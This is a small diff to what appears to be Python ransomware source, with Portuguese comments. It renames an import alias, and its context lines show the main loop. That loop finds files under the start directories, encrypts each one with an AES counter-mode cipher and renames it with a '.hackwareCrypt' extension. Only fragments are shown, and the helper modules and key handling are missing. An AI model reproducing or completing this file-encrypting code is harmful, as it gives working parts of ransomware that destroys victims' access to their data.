@@ -4,7 +4,7 @@ from Crypto.Util import Counter
 import argparse
 import os
 import discovery
-import hue as Cripter
+import hue as Crypter
 
 # ----------------------
 # Variáveis Globais
@@ -51,7 +51,7 @@ def main():
 
     for currentDir in startdirs:
         for filename in discovery.discover(currentDir):
-            Cripter.change_files(filename, crypt.encrypt)
+            Crypter.change_files(filename, crypt.encrypt)
             # Renomeia o arquivo pra indicar a encriptação
             os.rename(filename, filename+'.hackwareCrypt')
 
